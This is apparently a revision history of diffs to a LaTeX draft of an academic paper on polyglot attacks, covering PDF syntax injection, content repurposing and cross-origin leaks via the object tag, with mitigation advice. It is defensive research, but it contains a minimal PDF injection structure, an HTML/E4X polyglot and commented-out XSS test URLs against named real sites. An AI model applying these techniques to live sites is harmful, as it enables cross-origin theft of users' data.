-As E4X is only supported in the SpiderMonkey JavaScript engine, used in 
-Firefox, this limits the exploitability of this example.
-While this is an unlikely scenario using JavaScript as the injected format, 
-section \ref{sec:vuln} will show how this can be achieved in practice.
-
-% The below example is too long and complicated.
-
-%\begin{lstlisting}[label=lst:php-sample,caption=Vulnerable PHP-program,captionpos=b]
-%<?php
-%session_start();
-%$_SESSION["secret"] = rand();
-%?>
-%<html><body>
-%Your guess: <?=$_GET["guess"]?>!
-%The secret is: <?=$_SESSION["secret"]?>
-%</body></html>
-%\end{lstlisting}
-%\begin{lstlisting}[label=lst:html-js,caption=Vulnerable %PHP-program,captionpos=b]
-%<html><body>
-%Your guess: </body></html>;x=<html><body>!
-%The secret is: 521352342
-%</body></html>
-%\end{lstlisting}
-%\if 0
-%$
-%\fi
+Policy~\cite{Heyes:CSP}. As E4X is only supported in the SpiderMonkey JavaScript
+engine, used in Firefox, this limits the exploitability of this example. While
+this is an unlikely scenario using JavaScript as the injected format, section
+\ref{sec:vuln} will show how this can be achieved in practice.
 
@@
 % Description of attack technique 
-A content repurposing attack attacks a website that allows and serves user supplied files.
-This could be a file sharing service, an image database, or a job search service.
-The files are verified to be of a certain benign file type, e.g.
-an image, before being served to the end user.
-By submitting a polyglot to such a service, an attacker can trick the service into serving malicious content under the origin of the service.
-The service will verify the file, assuming that it is of the benign format, but once the content is served an attacker can coerce the content to be interpreted as the malicious format.
+A content repurposing attack attacks a website
+that allows and serves user supplied files. This could be a file sharing
+service, an image database, or a job search service. The files are verified to
+be of a certain benign file type, e.g. an image, before being served to the end
+user. By submitting a polyglot to such a service, an attacker can trick the
+service into serving malicious content under the origin of the service. The
+service will verify the file, assuming that it is of the benign format, but once
+the content is served an attacker can coerce the content to be interpreted as
+the malicious format.
 
@@
 
-The difference in this scenario from the previous one is in the nature of the vulnerability.
-Where in the previous scenario an existing document was injected to become a polyglot, this scenario targets services which allow an attacker to introduce new documents.
-As in the previous scenario, the target is a user of the vulnerable website.
+The difference in this scenario from the previous one is in the nature of the
+vulnerability. Where in the previous scenario an existing document was injected
+to become a polyglot, this scenario targets services which allow an attacker to
+introduce new documents. As in the previous scenario, the target is a user of
+the vulnerable website.
 
-For this attack to be successful certain requirements needs to be 
-fulfilled.
-
+For this attack to be successful, certain requirements needs to be fulfilled.
 \begin{itemize} 
@@
 	assumption that it is in the benign format. 
-	\item There must exist a way of coercing the polyglot to be 
-				interpreted as the malicious format.
+	\item The content is served under the same origin as sensitive user 
+	information.
+	\item There must exist a way of coercing the polyglot to be interpreted 
+	as the malicious format. 
 \end{itemize}
@@
 
-In this section we give concrete examples of the attacks described in the previous section, using the PDF format as the running example.
+In this section we give concrete examples of the attacks described in the
+previous section, using the PDF format as the running example.
 
@@
 
-\subsubsection{The PDF format}
+\subsection{The PDF format}
 
@@
 The PDF format is a widely used, text based format with powerful capabilities.
-It can be used for displaying text, rendering graphics, animation and dynamic content.
-It is also a container format which allows for embedding of other files and formats.
-This and the fact that it is designed to be robust against errors, provides us with a format that is powerful, flexible and ideal for creating malicious polyglots.
+It can be used for displaying text, rendering graphics, animation and dynamic
+content. It is also a container format which allows for embedding of other files
+and formats. This and the fact that it is designed to be robust against errors,
+provides us with a format that is powerful, flexible and ideal for creating
+malicious polyglots.
 
@@
 
-Furthermore the PDF format is of particular interest to us because it can execute JavaScript and send HTTP requests to the server from which the document originated.
+Furthermore the PDF format is of particular interest to us because it can
+execute JavaScript and send HTTP requests to the server from which the document
+originated.
+
+\subsubsection{Cross-origin communication}
+
+For communication with the containing page, one can either use
+hostContainer.postMessage(info) or app.launchURL('\#'+info). The latter has the
+advantage that it works in Firefox which seems to not handle the postMessage
+very well.
 
@@
 
-The object-tag is used to embed content in a web page, which requires a plug-in to run.
-The plug-in is selected based on the MIME-type of the content, but because the server delivering the content might not be able to determine its format, the object tag allows a developer to set the type-attribute to guide the browser in which plug-in to run.
-When the type attribute is used, the corresponding plug-in is run regardless of which MIME-type the server returns and it is up to the plug-in to respond to and handle the content it is served.
+The object-tag is used to embed content, which requires a plug-in
+to run, in a web page. The plug-in is selected based on the MIME-type of the content, but
+because the server delivering the content might not be able to determine its
+format, the object tag allows a developer to set the type-attribute to guide the
+browser in which plug-in to run. When the type attribute is used, the
+corresponding plug-in is run regardless of which MIME-type the server returns
+and it is up to the plug-in to respond to and handle the content it is served.
 
-In the case of the Adobe Reader plug-in completely disregards the MIME-type supplied by the server and will attempt to interpret any content as PDF.
+As it turns out, various plug-ins deal with the situation differently. The Chrome browser
+built-in PDF reader refuses to render content that was served with an inappropriate 
+MIME-type. The Java plug-in used to ignore the MIME-type, but after several 
+vulnerabilities were disclosed, this behavior was changed.
 
-\subsubsection{Cross-origin communication}
-
-For communication with the containing page, one can either use 
-hostContainer.postMessage(info) or app.launchURL('\#'+info). The 
-latter has the advantage that it works in Firefox which seems 
-to not handle the postMessage very well.
+In the case of the Adobe Reader plug-in, it completely disregards the MIME-type
+supplied by the server and will attempt to interpret any content as PDF. If the 
+Chrome browser is configured to use the Adobe Reader plug-in, the behavior will 
+be the same as in other browsers and the content will be interpreted as PDF.
 
@@
 
-the minimal malformed structure that is required for Adobe 
-Reader to consider it a PDF.
+the minimal malformed structure that is required for Adobe Reader to consider ita PDF.
 
-[anything] \%PDF- [anything] \
-[ anything ] [space] trailer [space] << [any name value pair] 
-/Root [space] <<[any name value pair] /Pages [space]<< [any name value pair] 
->> [any name value pair] >> [any name value pair] >>
+\begin{lstlisting}[label=lst:minimal-pdf, caption=HTML / E4X Polyglot]
+\%PDF-\
+trailer<</Root<</Pages<<>>>>>>
+\end{lstlisting}
 
-This means the required tokens that we need to be able to 
-inject are: \%PDF-, trailer, <<, >> and /.
-The \%PDF and trailer token is usually no problem. From what 
-I have seen, sometimes PDF is turned to lower case which 
-prevents the attacks. Quite naturally, unless the site is 
-vulnerable to traditional XSS, the << and >> tokens are usually 
-converted to \&lt; or some other encoding. The exception is in 
-a JavaScript string context. In this context only </script> 
-pose a threat, in case the < is not encoded this is usually 
-prevented by escaping the slash:
+This means the required tokens that we need to be able to inject are: \%PDF-,
+trailer, <<, >> and /. The \%PDF and trailer token is usually no problem. From
+what I have seen, sometimes PDF is turned to lower case which prevents the
+attacks. Quite naturally, unless the site is vulnerable to traditional XSS, the
+<< and >> tokens are usually converted to \&lt; or some other encoding. The
+exception is in a JavaScript string context. In this context only </script> pose
+a threat, in case the < is not encoded this is usually prevented by escaping the
+slash:
 
@@
 
-This is bad from a PDF syntax point of view, because \\/Root is 
-not valid. But </script> is only valid when the < is directly 
-followed by /. So we can create a PoC which is not vulnerable to 
-traditional XSS, where the injection is  in a string and only </ 
-is escaped, which will be vulnerable to PDF injection.
+This is bad from a PDF syntax point of view, because \\/Root is not valid. But
+</script> is only valid when the < is directly followed by /. So we can create a
+PoC which is not vulnerable to traditional XSS, where the injection is in a
+string and only </ is escaped, which will be vulnerable to PDF injection.
 
-\subsection{Polyglot upload}
+\subsection{Content repurposing}
 
@@
 
-Filter can verify that the benign file format is indeed benign 
-without ever noticing the malicious file format hidden within.
+Filter can verify that the benign file format is indeed benign without ever
+noticing the malicious file format hidden within.
 
@@
 
-This effectively bypasses any cross-site scripting filters such as 
-NoScript or filters built into browsers. Since the Reader plug-in 
-handles the response, the browser never gets to see the content
+This effectively bypasses any cross-site scripting filters such as NoScript or
+filters built into browsers. Since the Reader plug-in handles the response, the
+browser never gets to see the content
 
@@
 
-Clever filters that adapt their filtering to the context in which 
-the user content is included. Basically filters that allow input 
-that do not form harmful HTML.
+Clever filters that adapt their filtering to the context in which the user
+content is included. Basically filters that allow input that do not form harmfulHTML.
 
@@
 %alibaba.com (allows <>, but escapes /)
-%about.com (vulnerable to traditional XSS, http://linux.about.com/sitesearch.htm?q=XSS&SUName=--%3E%3Cimg+src=x+onerror=alert%281%29%3E)
-%sogou.com (potential target http://www.sogou.com/web?query=%25PDF+%3C%3C+%2F+%3E%3E&_asf=www.sogou.com&_ast=1349689275&w=01019900&p=40040100&sut=11010&sst0=1349689274528)
+%about.com (vulnerable to traditional XSS,
+%http://linux.about.com/sitesearch.htm?q=XSS&SUName=--%3E%3Cimg+src=x+onerror=alert%281%29%3E)
+%sogou.com (potential target
+%http://www.sogou.com/web?query=%25PDF+%3C%3C+%2F+%3E%3E&_asf=www.sogou.com&_ast=1349689275&w=01019900&p=40040100&sut=11010&sst0=1349689274528)
 
@@
 
-This section will describe our recommendations for mitigation in each of the affected components.
+This section will describe our recommendations for mitigation in each of the
+affected components.
 
 \subsection{Server-side mitigation}
+
+As a content provider on the Internet today there are precautions that one can 
+take to mitigate this class of vulnerabilities. Which precautions to take depend 
+on the kind of services provided. The mitigation recommendations for syntax 
+injection apply to services that rely on user input, and the content repurposing 
+recommendations apply to services that serve user-supplied files.
 
@@
 Preventing syntax injection attacks on the server-side poses severe challenges.
-Even server-side filtering of HTML syntax to prevent cross-side scripting attacks has proved difficult due to the many contexts in which JavaScript can be introduced.
-Filtering all potentially harmful tokens from all formats in which a document could be interpreted, will likely be near impossible.
+Even server-side filtering of HTML syntax to prevent cross-side scripting
+attacks has proved difficult due to the many contexts in which JavaScript can be 
+introduced. Filtering all potentially harmful tokens from all formats in which a 
+document could be interpreted, will likely be near impossible.
 
-\subsubsection{Polyglot upload}
+To prevent PDF syntax injection attack, the task is simpler. As mentioned in Section~\ref{sec:vuln}, there is a limited 
+set of characters that are essential to create valid PDF syntax, namely \emph{'$<$', '$>$', and '/'}. Filtering 
+user input to remove or encode these characters effectively mitigates the vulnerability.
 
-Serve content from a sandbox domain.
+\subsubsection{Content repurposing}
+
+The current best-practice recommendation from Google~\cite{Google:ContentHosting} 
+on hosting user-supplied content, is to serve the content from an origin that is 
+completely separate, and isolated from the sensitive services. It also describes how 
+Google moved away from sanitizing content , as it was found to be insufficient in 
+many cases.
+
+Google uses the domain name \emph{googleusercontent.com} to sandbox all the 
+untrusted user files that their various services provide for their customers.
 
@@
 
-Prevent object-tag type attribute to override content type 
-provided by server.
+Traditionally, browser vendors have allowed the browser to override the 
+MIME-type provided by the server for compatibility reasons. This is a compromise 
+to deal with the situation that the server is confused as to what kind of content it is serving. This compromise 
+has repeatedly shown to lead to security issues. The affected browser vendors 
+could help mitigate this problem by limiting the ways content can be coerced to be 
+interpreted as a particular format.
 
-\subsection{Reader}
+In the case of PDF-based polyglots, the browser could intervene when there is a 
+mismatch between the content-type provided by the server and the type attribute 
+of the object tag. By acknowledging that there could be a potential security issue in 
+interpreting the supplied content in the requested format and alerting the user to this
+threat, the vulnerability could be mitigated.
 
-Stricter parsing of PDF files.
+One could argue that the browser is as confused as the originating server as to the 
+actual format of the content, and that the issue would be best resolved by the 
+corresponding plug-in.
 
-Not render content served with incorrect content type.
+\subsection{Interpreter}
+
+As a general rule of thumb, the interpreter at the very least alert the user if the served 
+content-type differs from the expected. A preferred alternative would be to 
+not attempt to interpret the content at all. This holds true especially when 
+the served content-type is well known and radically different from that which 
+the interpreter is designed for.
+
+As for the PDF file format, the underlying design decisions has led to the 
+current parsing being very relaxed, even with respect to the specification. 
+Making the parsing more strict and enforcing many of the specified requirements 
+would greatly reduce the attack surface. It is, however, not a complete 
+mitigation approach. Since the PDF format is a container format it is designed to 
+embed syntax from other files. Even when parsing strictly according to 
+the specification, it would be a simple task to create a PDF-based polyglot.
 
@@
 \end{document}
+
+% The below example is too long and complicated.
+
+%\begin{lstlisting}[label=lst:php-sample,caption=Vulnerable
+%PHP-program,captionpos=b] 
+%<?php %session_start(); %$_SESSION["secret"] = rand(); 
+%?> 
+%<html><body> 
+%Your guess: <?=$_GET["guess"]?>! 
+%The secret is: <?=$_SESSION["secret"]?> 
+%</body></html> 
+%\end{lstlisting}
+%\begin{lstlisting}[label=lst:html-js,caption=Vulnerable
+%PHP-program,captionpos=b] 
+%<html><body> 
+%Your guess:</body></html>;x=<html><body>! 
+%The secret is: 521352342 
+%</body></html>
+%\end{lstlisting} 
+%\if 0 
+%$ 
+%\fi

### 2012-11-08 main.tex
conclusions

@@
 % 
-This paper focuseson the root cause of a large class of attacks: \emph{polyglots}. 
+This paper focuses on the root cause of a large class of attacks: \emph{polyglots}. 
 A polyglot is aprogram that is valid in multiple programming languages. Polyglots allow
@@
 attacks, and report on vulnerabilities in the top 100 Alexa web sites. Our
-recommendations for protective measures on server side, in browsers, and in PDF
-readers show how to mitigate the attacks.
+recommendations for protective measures on server side, in browsers, and in content
+interpreters (such as PDF readers) show how to mitigate the attacks.
 \end{abstract}
@@
 \section{Conclusions}
+We have put a spotlight on a new breed of attacks that smuggle
+malicious payload formatted as benign content. We have identified
+polyglots as the root cause for this class of attacks. In a systematic
+study, we have characterized the necessary ingredients for
+polyglot-based attacks on the web and arrive at the PDF format to be
+particularly dangerous. Our empirical studies in the web setting
+confirm vulnerabilities in the current content filters both in the
+server side and in browsers, as well as in the PDF interpreters.
+These vulnerabilities open up for insecure communication across
+Internet origins and allow attacking web sites from the top 100 Alexa
+list. To mitigate the attacks, we suggest general measures against
+polyglot-based attacks.  These measures are a combination of
+protection on the server side, in browsers, and in content
+interpreters such as PDF readers.
 
-We have contacted the vendors...
+The affected vendors have been made aware of the
+vulnerabilities. These vendors include Adobe (notified instantly after
+discovering the security implications of polyglot PDFs)
+%in late 2009
+and the major browser vendors. We have also contacted the vulnerable
+web sites from the top 100 Alexa list.
 
-Mentioned that Adobe was notified long time ago.
+Future work includes identification of further formats vulnerable to
+polyglot-based attacks. Versatile media content formats such as the
+Windows Media Video format are of particular concern because of their
+potential for executing scripts. Further investigation of the PDF
+format might lead to enhanced possibilities to bypass content filters
+by alternative character sets.
+
+We also plan to extend the empirical study to popular services like
+HotCRP, Europass CV, and arXiv.org that allow uploading PDF
+documents. Authorization is pending for an in-depth security study of
+a major conference submission system.
 

### 2012-11-22 main.tex
Section Crossing-origins neearly complete.

@@
 
-In this section we generalize the problem and describe how it can be abused to
-circumvent the same-origin policy.
+This section describes how formats can be crossed and how that can be abused 
+to cross origins by circumventing the \emph{Same-Origin Policy}. We begin by 
+generalizing the problem of crossing formats to \emph{polyglots} and then describe the  
+characteristics of a malicious polyglot. From that we derive two attack vectors and 
+show how previous work on the subject relate to these vectors.
 
-\subsection{Polyglots}
+\subsection{Crossing formats}
 
@@
 is often accomplished by hiding the parts of the code specific to one language,
-in parts interpreted as comments or text of another.
+in parts interpreted as comments or plain text of another.
 
@@
 
-\subsection{Malicious polyglots}
+\paragraph{Malicious polyglots}
 
-A polyglot can be used for malicious purposes if there is a difference between
-the expected execution environment and the actual environment it is executed in.
+% What is a malicious polyglot? - One part benign one part malicious
+
+A malicious polyglot is composed of two formats where one is benign in nature and the other
+contains a malicious payload. 
+% Under what circumstances can a polyglot be malicious
+This kind of polyglot can be used for malicious purposes when there is a difference between
+the expected run-time context and the actual context it is executed in. 
+In the expected context the content would be interpreted as the 
+benign format. In the actual context, however, the content is coerced to be 
+interpreted as the malicious format containing the payload.
+
+Even if a verification process exists, it would verify that the content is valid 
+in the expected context. Due to the nature of the polyglot, the content would be 
+verified as valid and benign, but subsequently the malicious
+content is executed.
+
+In a web context, 
+% Characteristics of a malicious polyglot
+
+% Malicious polyglots in literature; gifar, chameleon, cross-origin css attacks
+
+% We have identified two classes of malicious polyglots; those based on syntax injection, and those based on content repurposing.
+
 If the content is verified to be benign in
@@
 verified, with content, that is malicious when executed. The verification
-process will see the benign content and allow it, but subsequently the malicious
-content is executed.
+process will see the benign content and allow it
 
 In literature we find Content repurposing, content smuggling, chameleon, gifar
+
+\subsection{Crossing origins}
+
+By crossing origins we mean being able to request and access content
+which is normally restricted under the Same-Origin Policy (SOP). 
+The SOP dictates that a two document can only access each others 
+content and resources if they share the same origin. Similarly this applies to communication as 
+well; a document can only directly communicate with the server from which it originated. 
+This is not to be confused with Cross-Origin Resource Sharing (CORS), which is an 
+intentional relaxing of the SOP.
+
+While there are exceptions to this policy, e.g. images, scripts, and style sheets 
+are allowed to be included as resources across origins, access to these resources is 
+carefully restricted to prevent information leaks. As an example, the including 
+document is prevented from accessing the image data of images loaded across 
+origins.
+
+Not all elements are as carefully restricted from information leaks as images. 
+Scripts loaded across origins become part of the document and inherit the 
+origin of the including document, which allows the script to communicate with the 
+server from which the \emph{document} originated. Such scripts are also able to interact 
+with the document, e.g. by adding nodes, which in turn require new content to be 
+requested. Since these requests are not restricted by the SOP, this creates a side 
+channel that permits cross-origin information leakage. At the same time, the including document
+is prevented from inspecting the source of the script and can only observe the public 
+side-effects that the script produce as it is executed.
+
+Other examples of problematic elements include the object- and embed-tags. These 
+tags allow inclusion of resources that might require a 
+plug-in to run. As with images, the content handled by the plug-in retains its origin, 
+but the browsers are forced to rely on the plug-ins to employ correct security 
+measures to prevent information leaks. While the containing page is restricted 
+from directly accessing the content handled by the plug-in, a number of plugins provide 
+an API for interacting with the plug-in and the data. As we will show, this can easily lead to 
+to cross-origin information leaks.
 
@@
 The target in this scenario is a user of the vulnerable website. The polyglot is
-served in the benign format on the vulnerable server. However, the attack is
-initiated from a page belonging to the attacker. While the user is logged in to
+served in the benign format on the vulnerable server. While the user is logged in to
 the service that the vulnerable website provides, the user unsuspectingly visits
 the attackers malicious website. The page embeds the polyglot content, but
-coerces it to be interpreted as the malicious format. The attacker can now
+coerces the browser to interpret the content as the malicious format. 
+How  on the capabilities of the malicious format, 
+The attacker can now
 exploit the vulnerability, either by making requests to the vulnerable website
@@
 The PDF format is a widely used, text based format with powerful capabilities.
-It can be used for displaying text, rendering graphics, animation and dynamic
-content. It is also a container format which allows for embedding of other files
+It is capable of displaying text, rendering graphics, animation and dynamic
+content. It is a container format which allows for embedding of other files
 and formats. This and the fact that it is designed to be robust against errors,
@@
 
-%Several design choices
+% Several design choices
+
+% - Error tolerant parsing
+% - Execute JavaScript
+% - Embed flash files
+% - Launch commands
 
@@
 
-\subsubsection{Cross-origin communication}
+\subsubsection{PDF communication channels}
 
@@
 
-\subsubsection{The object-tag}
+\subsection{The object-tag}
 
@@
 
-The object-tag is used to embed content, which requires a plug-in
+The object-tag is used to embed content, which requires a browser plug-in
 to run, in a web page. The plug-in is selected based on the MIME-type of the content, but
@@
 
-As it turns out, various plug-ins deal with the situation differently. The Chrome browser
+As it turns out, various browser plug-ins deal with the situation differently. The Chrome browser
 built-in PDF reader refuses to render content that was served with an inappropriate 
@@
 \begin{lstlisting}[label=lst:minimal-pdf, caption=HTML / E4X Polyglot]
-\%PDF-\
+%PDF-
 trailer<</Root<</Pages<<>>>>>>

### 2012-11-22 main.tex
Section Crossing-origins complete.

@@
 This paper focuses on the root cause of a large class of attacks: \emph{polyglots}. 
-A polyglot is aprogram that is valid in multiple programming languages. Polyglots allow
+A polyglot is a program that is valid in multiple programming languages. Polyglots allow
 multiple interpretation of the content, providing a new space of attack vectors.
@@
 
-\subsection{Crossing formats}
-
-% What and how?
-
-A polyglot is defined as ``A person who knows several languages.'', and the term
-is widely used in various fields of science. In computer science, a polyglot is
-a program that is valid in multiple programming languages. In this paper we use
-a broader definition of a programming language, not limited to code meant for
-compilation to machine code or scripting languages, but extended to any format
-that requires interpretation before rendering.
-
-A polyglot is composed from various constructs that are either common between
-languages; or constructs that are language specific, but carrying different
-meaning in each language. To maintain validity across languages, one must ensure
-that language specific constructs are not interpreted by other languages. This
-is often accomplished by hiding the parts of the code specific to one language,
-in parts interpreted as comments or plain text of another.
-
-Certain languages are particularly suitable for creating polyglots. These
-languages either have a lot of constructs in common with other languages, such
-as \emph{C}, or are defined such that the parser ignores that which it cannot
-interpret, such as \emph{HTML}. The latter allows for ample opportunity to hide
-any code specific to another language, as long as there is no overlap with the
-syntax of the first language.
-
-\paragraph{Malicious polyglots}
-
-% What is a malicious polyglot? - One part benign one part malicious
-
-A malicious polyglot is composed of two formats where one is benign in nature and the other
-contains a malicious payload. 
-% Under what circumstances can a polyglot be malicious
-This kind of polyglot can be used for malicious purposes when there is a difference between
-the expected run-time context and the actual context it is executed in. 
-In the expected context the content would be interpreted as the 
-benign format. In the actual context, however, the content is coerced to be 
-interpreted as the malicious format containing the payload.
-
-Even if a verification process exists, it would verify that the content is valid 
-in the expected context. Due to the nature of the polyglot, the content would be 
-verified as valid and benign, but subsequently the malicious
-content is executed.
-
-In a web context, 
-% Characteristics of a malicious polyglot
-
-% Malicious polyglots in literature; gifar, chameleon, cross-origin css attacks
-
-% We have identified two classes of malicious polyglots; those based on syntax injection, and those based on content repurposing.
-
-If the content is verified to be benign in
-
-  In the situation where
-
-at the time of verification compared to time of use
-
-It is possible to create such a polyglot by mixing content, that is benign when
-verified, with content, that is malicious when executed. The verification
-process will see the benign content and allow it
-
-In literature we find Content repurposing, content smuggling, chameleon, gifar
-
 \subsection{Crossing origins}
@@
 to cross-origin information leaks.
+
+\subsection{Crossing formats}
+
+% What and how?
+
+A polyglot is defined as ``A person who knows several languages.'', and the term
+is widely used in various fields of science. In computer science, a polyglot is
+a program that is valid in multiple programming languages. In this paper we use
+a broader definition of a programming language, not limited to code meant for
+compilation to machine code or scripting languages, but extended to any format
+that requires interpretation before rendering.
+
+A polyglot is composed from various constructs that are either common between
+languages; or constructs that are language specific, but carrying different
+meaning in each language. To maintain validity across languages, one must ensure
+that language specific constructs are not interpreted by other languages. This
+is often accomplished by hiding the parts of the code specific to one language,
+in parts interpreted as comments or plain text of another.
+
+Certain languages are particularly suitable for creating polyglots. These
+languages either have a lot of constructs in common with other languages, such
+as \emph{C}, or are defined such that the parser ignores that which it cannot
+interpret, such as \emph{HTML}. The latter allows for ample opportunity to hide
+any code specific to another language, as long as there is no overlap with the
+syntax of the first language.
+
+\paragraph{Malicious polyglots}
+
+% What is a malicious polyglot? - One part benign one part malicious
+
+A malicious polyglot is composed of two formats where one is benign in nature and the other
+contains a malicious payload. 
+% Characteristics of a malicious polyglot
+The benign format would preferably be a widely accepted format with the capability 
+of hiding arbitrary data, e.g. an image with comment fields. The malicious file 
+format would ideally have strong capabilities, s
+% Under what circumstances can a polyglot be malicious
+This kind of polyglot can be used for malicious purposes when there is a difference between
+the expected run-time context and the actual context it is executed in. 
+In the expected context the content would be interpreted as the 
+benign format. In the actual context, however, the content is coerced to be 
+interpreted as the malicious format containing the payload.
+
+Even if a verification process exists, it would verify that the content is valid 
+in the expected context. Due to the nature of the polyglot, the content would be 
+verified as valid and benign, but subsequently the malicious
+content is executed.
+
+In a web context, coercing content to be interpreted as a different type be 
+done easily. If the content is loaded using an image-tag it will be interpreted 
+as an image, if a script-tag is used it will be interpreted as a script. Some 
+tags even let the developer decide which type to interpret the content as. 
+To prevent abuse, the browsers employ content-type 
+sniffing for certain content-types, a practice which has historically led to 
+security issues.
+
+% Malicious polyglots in literature; gifar, chameleon, cross-origin css attacks
+
+We have identified two vectors in which malicious polyglots can be used for 
+exploitation; syntax injection, and content repurposing.
+
+%It is possible to create such a polyglot by mixing content, that is benign when
+%verified, with content, that is malicious when executed. The verification
+%process will see the benign content and allow it
+
+%In literature we find Content repurposing, content smuggling, chameleon, gifar
 
@@
 % Description of attack technique 
-A content repurposing attack attacks a website
+A content repurposing attack targets the users of a website
 that allows and serves user supplied files. This could be a file sharing
-service, an image database, or a job search service. The files are verified to
-be of a certain benign file type, e.g. an image, before being served to the end
+service, an image database, or a job search service. The service would only 
+accept a limited set of file-types, and the files are verified to
+be of one of these types, e.g. an image, before being served to the end
 user. By submitting a polyglot to such a service, an attacker can trick the

### 2012-11-22 main.tex
edits in Section 2

@@
-\documentclass[10pt, conference, compsocconf]{IEEEtran}
+\documentclass{acm_proc_article-sp}
+%\documentclass[10pt, conference, compsocconf]{IEEEtran}
 
 \usepackage{listings}
+
+\usepackage{amssymb}
+\usepackage[usenames]{color}
+\definecolor{lightred}{rgb}{1,0.8,0.8}
+\newcommand{\todo}[1]{\colorbox{red}{\textcolor{white}{\sffamily\bfseries\scriptsize TODO}} \textcolor{red}{#1} \textcolor{red}{$\blacktriangleleft$}}
 
@@
 
-\begin{IEEEkeywords}
-Web Security; Polyglot; Injection; Cross-domain.
-\end{IEEEkeywords}
+% \begin{IEEEkeywords}
+% Web Security; Polyglot; Injection; Cross-domain.
+% \end{IEEEkeywords}
 
@@
 
+\todo{Define SOP}
+
 %3 pages
@@
 This section describes how formats can be crossed and how that can be abused 
-to cross origins by circumventing the \emph{Same-Origin Policy}. We begin by 
+to cross origins by circumventing the Same-Origin Policy. We begin by 
 generalizing the problem of crossing formats to \emph{polyglots} and then describe the  
@@
 By crossing origins we mean being able to request and access content
-which is normally restricted under the Same-Origin Policy (SOP). 
-The SOP dictates that a two document can only access each others 
+which is normally restricted under the Same-Origin Policy. 
+Recall that SOP dictates that a two document can only access each others 
 content and resources if they share the same origin. Similarly this applies to communication as 
@@
 from directly accessing the content handled by the plug-in, a number of plugins provide 
-an API for interacting with the plug-in and the data. As we will show, this can easily lead to 
+an API for interacting with the plug-in and the data. As we will show, this can lead to 
 to cross-origin information leaks.
@@
 A polyglot is defined as ``A person who knows several languages.'', and the term
-is widely used in various fields of science. In computer science, a polyglot is
+is widely used in various fields of science. In computer science, a \emph{polyglot} is
 a program that is valid in multiple programming languages. In this paper we use
@@
 
-\paragraph{Malicious polyglots}
+%\paragraph{Malicious polyglots}
 
@@
 % Characteristics of a malicious polyglot
-The benign format would preferably be a widely accepted format with the capability 
-of hiding arbitrary data, e.g. an image with comment fields. The malicious file 
-format would ideally have strong capabilities, s
+The benign format is a widely accepted format with the capability 
+of hiding arbitrary data, e.g. an image with comment fields. The malicious 
+format has additional capabilities, such as scripting.
 % Under what circumstances can a polyglot be malicious
@@
 the expected run-time context and the actual context it is executed in. 
-In the expected context the content would be interpreted as the 
+In the expected context the content is interpreted as the 
 benign format. In the actual context, however, the content is coerced to be 
@@
 
-Even if a verification process exists, it would verify that the content is valid 
-in the expected context. Due to the nature of the polyglot, the content would be 
+Even if a verification process exists, it verifies that the content is valid 
+in the expected context. Due to the nature of the polyglot, the content is 
 verified as valid and benign, but subsequently the malicious
@@
 security issues.
+\todo{explain the issues and cite Barthe et al.}
 
@@
 
+\todo{diagram}
 The target in this scenario is a user of the vulnerable website. The polyglot is
@@
 coerces the browser to interpret the content as the malicious format. 
-How  on the capabilities of the malicious format, 
-The attacker can now
+The capabilities of the malicious format determine the severity of the consequences.
+The attacker can
 exploit the vulnerability, either by making requests to the vulnerable website
@@
 able to inject an HTML document with JavaScript syntax in such a way that it
-became valid JavaScript, the attacker could include the document across origins
+became valid JavaScript, the attacker can include the document across origins
 via a script-tag and extract its content, thereby circumventing the same-origin
@@
 %the resulting document, 
-The document in listing \ref{lst:html-js}, is both
-malformed but valid HTML and valid JavaScript in browsers that support E4X. The
+The document in Listing \ref{lst:html-js}, is both
+malformed but valid HTML and valid JavaScript in browsers that support
+EcmaScript for XML (E4X). \todo{ref}
+
+The
 document can be included as a script in another document and the secret can be
-extracted from variable x. This implies that if an attacker is able to inject
-HTML syntax into a document, such that the result is two balanced E4X trees,
+extracted from variable x. 
+This implies that if an attacker is able to inject
+HTML syntax into a document, closing all previously open tags and
+opening all subsequently closed tags,
 then information can be extracted across origins.
+The injected HTML in the listing is illustrated by highlighting.
 
-\begin{lstlisting}[label=lst:html-js, caption=HTML / E4X Polyglot]
+\definecolor{lightgray}{gray}{.8}
+\begin{lstlisting}[label=lst:html-js, caption=HTML / E4X Polyglot, escapechar=*]
 <html><body>
-Hello </body></html>;x=<html><body>!
+Hello *\colorbox{lightgray}{$<$/body$><$/html$>$;x=$<$html$><$body$>$}*!
 Your secret is 'safe with me'.
@@
 Policy~\cite{Heyes:CSP}. As E4X is only supported in the SpiderMonkey JavaScript
-engine, used in Firefox, this limits the exploitability of this example. While
-this is an unlikely scenario using JavaScript as the injected format, section
-\ref{sec:vuln} will show how this can be achieved in practice.
+engine, used in Firefox, this limits the exploitability of this example. However,
+this is an unlikely scenario to use JavaScript as the injected format
+because HTML characters are typically escaped by content
+filters. 
+Instead,
+Section
+\ref{sec:vuln} will show practical attacks based on other formats.
+
+\todo{Mention and explain known attack instances}
 
 \subsection{Content repurposing}
-
+\todo{diagram}
 % Description of attack technique 
 A content repurposing attack targets the users of a website
-that allows and serves user supplied files. This could be a file sharing
-service, an image database, or a job search service. The service would only 
-accept a limited set of file-types, and the files are verified to
+that allows and serves user supplied files. Examples are a file sharing
+service, an image database, or a job search service. Such a service 
+accepts a limited set of file-types, and the files are verified to
 be of one of these types, e.g. an image, before being served to the end
@@
 % Scenarios
+\todo{Mention and explain known attack instances}
 
 %3 pages 
-\section{Vulnerabilities}
+\section{Vulnerabilities and attacks}
 \label{sec:vuln}
@@
 introduced. Filtering all potentially harmful tokens from all formats in which a 
-document could be interpreted, will likely be near impossible.
+document may be interpreted is hardly possible.
 
@@
 has repeatedly shown to lead to security issues. The affected browser vendors 
-could help mitigate this problem by limiting the ways content can be coerced to be 
+can help mitigate this problem by limiting the ways content can be coerced to be 
 interpreted as a particular format.
 
-In the case of PDF-based polyglots, the browser could intervene when there is a 
+In the case of PDF-based polyglots, the browser can intervene when there is a 
 mismatch between the content-type provided by the server and the type attribute 
-of the object tag. By acknowledging that there could be a potential security issue in 
+of the object tag. By acknowledging that there can be a potential security issue in 
 interpreting the supplied content in the requested format and alerting the user to this
-threat, the vulnerability could be mitigated.
+threat, the vulnerability can be mitigated.
 
-One could argue that the browser is as confused as the originating server as to the 
+One may argue that the browser is as confused as the originating server as to the 
 actual format of the content, and that the issue would be best resolved by the 
@@
 As a general rule of thumb, the interpreter at the very least alert the user if the served 
-content-type differs from the expected. A preferred alternative would be to 
+content-type differs from the expected. A preferred alternative is to 
 not attempt to interpret the content at all. This holds true especially when 
@@
 Making the parsing more strict and enforcing many of the specified requirements 
-would greatly reduce the attack surface. It is, however, not a complete 
